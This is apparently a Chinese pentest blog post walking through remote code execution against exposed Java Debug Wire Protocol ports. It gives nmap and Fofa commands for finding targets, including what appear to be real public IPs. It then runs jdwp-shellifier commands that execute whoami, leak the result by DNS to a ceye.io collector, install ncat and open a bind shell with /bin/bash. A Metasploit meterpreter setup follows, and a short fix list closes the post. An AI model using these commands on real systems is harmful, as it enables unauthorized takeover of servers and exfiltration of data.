---
title: JDWP
category:
- [Kali, Exploit]

encrypt: false
enc_pwd: askding
  
tags:
  - null
date: 2020-12-04 20:22:28
top:
updated:
---

JDWP（Java DEbugger Wire Protocol）：即Java调试线协议，是一个为Java调试而设计的通讯交互协议，

通过该协议，Debugger 端可以和 target VM 通信，可以获取目标 VM的包括类、对象、线程等信息。
在调试Android应用程序这一场景中，
- Debugger一般是指你的 develop machine 的某一支持 JDWP协议的工具例如 Android Studio 或者 JDB，
- Target JVM是指运行在你mobile设备当中的各个App（因为它们都是一个个虚拟机 Dalvik 或者 ART），
- JDWP Agent一般负责监听某一个端口，当有 Debugger向这一个端口发起请求的时候，Agent 就转发该请求给 target JVM并最终由该 JVM 来处理请求，并把 reply 信息返回给 Debugger 端。


## 信息收集

```
>>>nmap -Pn -T4  -sV -p 2005 10.184.67.1
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-03 16:54 CST
Nmap scan report for 10.184.67.1
Host is up (0.043s latency).

PORT     STATE SERVICE VERSION
2005/tcp open  jdwp    Java Debug Wire Protocol (Reference Implementation) version 1.8 1.8.0_45

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.72 seconds

不靠谱
>>>nmap -Pn -T4  -sV -p 2005  --script jdwp-exec  --script-args cmd="date"  10.184.67.1
>>>nmap -Pn -T4  -sV -p 2005  --script jdwp-info,jdwp-inject  10.184.67.1
```

## JDWP远程代码执行漏洞

telnnet 120.197.8.190 8000后，查看回显，如果出现“JDWP-Handshake”，则证明漏洞存在。

![jdwp-1](../images/jdwp-1.jpg)

### Fofa语法

语法：banner=”jdwp”

120.197.8.190

![jdwp-2](../images/jdwp-2.jpg)

### 测试是否存在

telnet/nc端口后，输入命令JDWP-Handshake  
如果返回JDWP-Handshake，证明存在漏洞。

```
{ echo "JDWP-Handshake"; sleep 20 } | telnet 221.221.221.221 10010
{ echo "JDWP-Handshake"; sleep 1 | trap exit INT} | nc 221.221.221.221 10010
```

### [IOActive/jdwp-shellifier](https://github.com/IOActive/jdwp-shellifier)利用
* 远程命令执行
本地执行python [jdwp-shellifier.py](http://jdwp-shellifier.py) -t 120.197.8.190 -p 8000 --break-on "java.lang.String.indexOf" **--cmd "whoami"**

```
 ./jdwp-shellifier.py -t 10.184.67.1 -p 2005 --break-on "java.lang.String.indexOf" --cmd "whoami"
[+] Targeting '10.184.67.1:2005'
[+] Reading settings for 'Java HotSpot(TM) 64-Bit Server VM - 1.8.0_45'
[+] Found Runtime class: id=5456
[+] Found Runtime.getRuntime(): id=7f9cb41916c0
[+] Created break event id=2
[+] Waiting for an event on 'java.lang.String.indexOf'
[+] Received matching event from thread 0x5542
[+] Selected payload 'whoami'
[+] Command string object created id:5543
[-] Unexpected returned type: expecting Object
[!] Command successfully executed
```
执行whoami，显示执行成功，但是没回显，无法探知。


* 远程命令执行（回显）

本地执行python [jdwp-shellifier.py](http://jdwp-shellifier.py) -t 120.197.8.190 -p 8000 --break-on "java.lang.String.indexOf" **--cmd "ping \`whoami\`.[http://ip.port.grqjsg.ceye.io](https://link.zhihu.com/?target=http%3A//ip.port.grqjsg.ceye.io)"**

得到远程主机的用户名为：root

![jdwp-3](../images/jdwp-3.jpg)

* 反弹SHELL

安装ncat
````
./jdwp-shellifier.py -t 10.184.67.1 -p 2005 --break-on "java.lang.String.indexOf" --cmd "sudo yum install -y nc"
````

反弹shell
````
./jdwp-shellifier.py -t 10.184.67.1 -p 2005 --break-on "java.lang.String.indexOf" --cmd  "ncat -v -l -p 7777 -e /bin/bash"
````

连接shell
````
nc 10.184.67.1 7777
````


### Metasploit利用

用msfconsole启动Metasploit，并且选用exploit/multi/misc/java\_jdwp\_debugger漏洞利用模块。

```
Module options (exploit/multi/misc/java_jdwp_debugger):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   RESPONSE_TIMEOUT  10               yes       Number of seconds to wait for a server response
   RHOSTS            10.184.67.1      yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT             2005             yes       The target port (TCP)
   TMP_PATH                           no        A directory where we can write files. Ensure there is a trailing slash


Payload options (linux/x64/meterpreter/bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST  10.184.67.1      no        The target address

```

### 修复建议

1.  关闭JDWP端口，或者JDWP端口不对公网开放
2.  关闭Java的debug模式（开启该模式对服务器性能有影响）


